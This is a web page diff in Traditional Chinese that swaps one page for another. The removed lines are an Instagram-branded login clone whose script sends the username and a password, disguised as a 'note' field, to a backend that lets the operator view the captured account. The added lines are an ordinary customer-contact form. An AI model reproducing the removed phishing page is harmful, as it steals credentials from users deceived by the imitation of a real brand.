@@ -3,62 +3,66 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>IG Login Template</title>
+  <title>客戶資料表單</title>
   <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <main class="screen">
-    <section class="phone">
-      <div class="locale">中文(台灣)</div>
+  <main class="shell">
+    <section class="hero">
+      <p class="eyebrow">客戶資料收集</p>
+      <h1>把聯絡資訊整理進後台</h1>
+      <p class="lede">
+        這是一個安全的動態表單。客戶送出後，後台會顯示姓名、電話、Email、備註與來源。
+      </p>
+    </section>
 
-      <img class="brand-image" src="instagram-logo.png" alt="Instagram logo" />
-
-      <form class="login-card" id="login-form">
-        <label class="input-field">
-          <span class="sr-only">用戶名稱、電子郵件地址或手機號碼</span>
-          <input name="username" type="text" placeholder="用戶名稱、電子郵件地址或手機號碼" autocomplete="username" required />
-        </label>
-
-        <label class="input-field">
-          <span class="sr-only">密碼</span>
-          <input name="note" type="password" placeholder="密碼" autocomplete="off" />
-        </label>
-
-        <button class="primary-btn" type="submit">登入</button>
-
-        <a class="forgot-link" href="#">忘記密碼？</a>
-
-        <p class="status" id="status" aria-live="polite"></p>
-      </form>
-
-      <div class="divider">
-        <span></span>
-        <p>或</p>
-        <span></span>
+    <section class="panel">
+      <div class="panel-head">
+        <h2>新增客戶</h2>
+        <p>手機與桌面都可直接填寫。</p>
       </div>
 
-      <button class="secondary-btn" type="button">建立新帳號</button>
+      <form class="form" id="client-form">
+        <label>
+          <span>姓名</span>
+          <input name="name" type="text" placeholder="王小明" autocomplete="name" required />
+        </label>
 
-      <img class="meta-image" src="meta-logo.png" alt="Meta" />
+        <label>
+          <span>電話</span>
+          <input name="phone" type="tel" placeholder="0912 345 678" autocomplete="tel" required />
+        </label>
+
+        <label>
+          <span>Email</span>
+          <input name="email" type="email" placeholder="name@example.com" autocomplete="email" required />
+        </label>
+
+        <label>
+          <span>備註</span>
+          <textarea name="note" placeholder="例如：週五再聯繫、想了解方案 A"></textarea>
+        </label>
+
+        <button type="submit">送出資料</button>
+        <p class="status" id="status" aria-live="polite"></p>
+      </form>
     </section>
   </main>
 
   <script>
-    const form = document.getElementById('login-form');
+    const form = document.getElementById('client-form');
     const status = document.getElementById('status');
 
-      form.addEventListener('submit', async (event) => {
+    form.addEventListener('submit', async (event) => {
       event.preventDefault();
 
       const data = new FormData(form);
-      const username = String(data.get('username') || '').trim();
-      const note = String(data.get('note') || '').trim();
-
       const payload = {
-        username,
-        note,
-        status: '登入嘗試',
-        source: 'iPhone 登入頁'
+        name: String(data.get('name') || '').trim(),
+        phone: String(data.get('phone') || '').trim(),
+        email: String(data.get('email') || '').trim(),
+        note: String(data.get('note') || '').trim(),
+        source: '網站表單'
       };
 
       const response = await fetch('/submit', {
@@ -68,7 +72,7 @@
       });
 
       if (response.ok) {
-        status.textContent = '已送出安全紀錄，後台可查看帳號。';
+        status.textContent = '資料已送出，後台會同步更新。';
         form.reset();
       } else {
         status.textContent = '送出失敗，請稍後再試。';
